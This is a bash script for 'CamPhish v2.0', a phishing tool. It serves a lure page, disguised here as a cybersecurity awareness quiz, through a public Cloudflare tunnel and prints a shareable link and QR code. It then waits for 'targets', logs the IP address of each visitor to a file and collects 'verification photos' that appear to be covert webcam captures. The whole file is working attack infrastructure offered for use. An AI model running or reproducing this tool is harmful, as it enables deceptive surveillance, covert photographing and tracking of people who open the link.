#!/bin/bash
# CamPhish v2.0
# Powered by TechChip

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"

printf "\n"


}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
if [[ "$windows_mode" == true ]]; then
  # Windows-specific process termination
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  # Unix-like systems
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

exit 1
}

catch_ip() {
  local logfile="$1"
  if [[ -f "$logfile" ]]; then
    ip=$(grep -a 'IP:' "$logfile" | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    cat "$logfile" >> saved.ip.txt
    rm -f "$logfile"
  fi
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Verification tracking is \e[0m\e[1;93mACTIVE\e[0m\n"

# Create ip_logs folder if not exists
mkdir -p ip_logs

while [ true ]; do

# Scan all log files inside ip_logs/
for log in ip_logs/ip_*.txt; do
  if [[ -e "$log" ]]; then
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
    catch_ip "$log"
  fi
done

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Verification photo received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 
}

cloudflare_tunnel() {
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: $os, Architecture: $arch\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\n"
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    if [[ -e cloudflared.exe ]]; then
        chmod +x cloudflared.exe
        # Create a wrapper script to run the exe
        echo '#!/bin/bash' > cloudflared
        echo './cloudflared.exe "$@"' >> cloudflared
        chmod +x cloudflared
    else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # Non-Windows systems
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
        else
            printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        
        if [[ -e cloudflared.tgz ]]; then
            tar -xzf cloudflared.tgz > /dev/null 2>&1
            chmod +x cloudflared
            rm cloudflared.tgz
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;92m[\e[0m+\e[1;92m] Architecture not specifically detected ($arch), defaulting to amd64...\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e cloudflared ]]; then
            chmod +x cloudflared
        else
            printf "\e[1;93m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (8 workers for high concurrency)...\n"
mkdir -p photos
# Use cross-platform PHP server start (PHP_CLI_SERVER_WORKERS not supported on Windows)
if [[ "$windows_mode" == true ]]; then
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
else
    PHP_CLI_SERVER_WORKERS=8 php -S 127.0.0.1:3333 > /dev/null 2>&1 &
fi
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
# Remove old log SYNCHRONOUSLY before starting tunnel (avoid race condition)
rm -f .cloudflared.log 2>/dev/null

# Use shell redirection (NOT --logfile) — more reliable on Windows Git Bash
if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel --url 127.0.0.1:3333 > .cloudflared.log 2>&1 &
else
    ./cloudflared tunnel --url 127.0.0.1:3333 > .cloudflared.log 2>&1 &
fi

# Wait up to 30 seconds for the tunnel URL to appear (Windows needs more time)
link=""
printf "\e[1;92m[\e[0m*\e[1;92m] Waiting for tunnel"
for i in $(seq 1 30); do
    sleep 1
    printf "."
    if [[ -f ".cloudflared.log" ]]; then
        link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log" | head -n1)
        if [[ -n "$link" ]]; then
            break
        fi
    fi
done
printf "\n"
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link (share this):\e[0m\e[1;77m %s\e[0m\n" $link
printf "\e[1;92m[\e[0m*\e[1;92m] Admin panel (local):\e[0m\e[1;93m http://localhost:3333/admin.php\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] Admin panel (any device):\e[0m\e[1;93m %s/admin.php\e[0m\n" $link
# Generate QR code
if command -v qrencode > /dev/null 2>&1; then
  qrencode -o qrcode.png -s 10 -m 2 "$link"
  printf "\e[1;92m[\e[0m*\e[1;92m] QR code saved:\e[0m\e[1;93m qrcode.png\e[0m (in current folder)\n"
else
  printf "\e[1;93m[!] qrencode not found. Install it: sudo apt install qrencode\e[0m\n"
fi
fi
payload_cloudflare
checkfound
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
sed 's+forwarding_link+'$link'+g' template.php > index.php
sed -e 's+forwarding_link+'$link'+g' -e 's+VERCEL_QUIZ_URL+'$vercel_quiz_url'+g' cybersec_quiz.html > index2.html
}



camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

select_template
cloudflare_tunnel
}

select_template() {
printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using: \e[0m\e[1;93mCyberSense - Cybersecurity Awareness Quiz\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your quiz URL (e.g. https://abin-shaji-thomas.github.io/Quiz/): \e[0m' vercel_quiz_url
vercel_quiz_url="${vercel_quiz_url:-https://abin-shaji-thomas.github.io/Quiz/}"
if [[ -z "$vercel_quiz_url" ]]; then
printf "\e[1;93m [!] Quiz URL cannot be empty!\e[0m\n"
select_template
fi
printf "\e[1;92m[\e[0m*\e[1;92m] Quiz URL set to:\e[0m\e[1;77m %s\e[0m\n" $vercel_quiz_url
}

banner
dependencies
camphish
